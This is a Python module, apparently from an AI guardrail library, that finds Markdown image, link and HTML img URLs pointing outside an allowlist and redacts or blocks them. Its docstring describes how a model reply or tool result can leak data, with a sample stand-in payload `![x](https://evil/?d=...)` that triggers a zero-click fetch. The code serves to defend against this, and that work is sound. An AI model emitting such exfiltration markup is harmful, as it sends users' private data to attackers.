"""Markdown image and link exfiltration: a reply or tool result that renders `![x](https://evil/?d=...)` makes
the client fetch the URL by itself (zero-click), and a link carries data out on one click. Targets outside
the allowed domains (plus the company's own) are cut out of the text; the link text stays readable."""

from __future__ import annotations

import re
from urllib.parse import urlparse

from ..config import ExfiltrationControl
from ..types import Action, Context, Finding, Span
from .base import applies, finding

# `![alt](url "title")` and `[text](url)`; group 1 is the URL. Also HTML <img src=...>, which Markdown renders.
_MD = re.compile(r"(!?)\[[^\]\n]{0,200}\]\(\s*<?(https?://[^\s)>]+)>?(?:\s+\"[^\"]*\")?\s*\)", re.IGNORECASE)
_IMG = re.compile(r"<img\b[^>]{0,200}?\bsrc\s*=\s*[\"']?(https?://[^\s\"'>]+)", re.IGNORECASE)


def allowed(url: str, domains: list[str]) -> bool:
    host = (urlparse(url).hostname or "").lower().rstrip(".")
    for d in domains:
        d = d.lower().strip(".")
        if host == d or host.endswith("." + d):
            return True
    return False


def check(ctx: Context, cfg: ExfiltrationControl, company_domains: list[str]) -> list[Finding]:
    if not applies(cfg, ctx) or "http" not in ctx.text.lower():
        return []
    domains = [*cfg.allowed_domains, *company_domains]
    images: list[Span] = []
    links: list[Span] = []
    for m in _MD.finditer(ctx.text):
        if not allowed(m.group(2), domains):
            (images if m.group(1) else links).append(Span(m.start(2), m.end(2), "exfil_url"))
    for m in _IMG.finditer(ctx.text):
        if not allowed(m.group(1), domains):
            images.append(Span(m.start(1), m.end(1), "exfil_url"))
    # mode: block refuses the whole text; redact (the default) cuts out just the URL.
    proposed = Action.BLOCK if cfg.mode is Action.BLOCK else Action.REDACT
    out = []
    for kind, spans in (("markdown_image", images), ("markdown_link", links)):
        if spans:
            hosts = sorted({urlparse(ctx.text[s.start : s.end]).hostname or "?" for s in spans})
            out.append(
                finding(
                    "exfiltration",
                    cfg,
                    kind,
                    proposed,
                    detail=f"{kind.replace('_', ' ')} to a domain outside the allowlist: {', '.join(hosts[:5])}",
                    spans=spans,
                )
            )
    return out
